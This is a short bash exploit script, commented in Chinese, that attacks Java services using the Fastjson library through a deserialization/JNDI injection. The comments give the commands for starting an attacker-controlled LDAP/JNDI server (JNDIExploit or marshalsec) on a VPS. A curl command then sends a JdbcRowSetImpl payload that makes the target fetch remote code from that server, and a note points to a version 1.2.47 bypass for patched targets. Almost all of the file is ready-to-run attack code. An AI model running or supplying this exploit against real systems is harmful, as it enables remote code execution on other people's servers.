#!/usr/bin/env bash
# 1) 起 JNDI 服务（VPS 上）：JNDIExploit 或 marshalsec
#    java -jar JNDIExploit-1.4-SNAPSHOT.jar -i <VPS> -l 1389 -p 8080
#    # 或
#    java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://<VPS>:8080/#Exploit" 1389
#
# 2) 打目标 JSON 接口（Content-Type 必须是 application/json）
TARGET="${1:?usage: bash fastjson.sh http://TARGET:PORT/api/json <VPS>}"
VPS="${2:?usage: bash fastjson.sh http://TARGET:PORT/api/json <VPS>}"
curl -sS -m 15 -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  --data "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://$VPS:1389/Exploit\",\"autoTypeSupport\":true}"
#
# 3) 判定：VPS 上 LDAP 日志出现该请求 = 反序列化触发成功
#    无回连但响应报 "autoType is not support" → 是 fastjson 且修补过，换 1.2.47 绕过条目
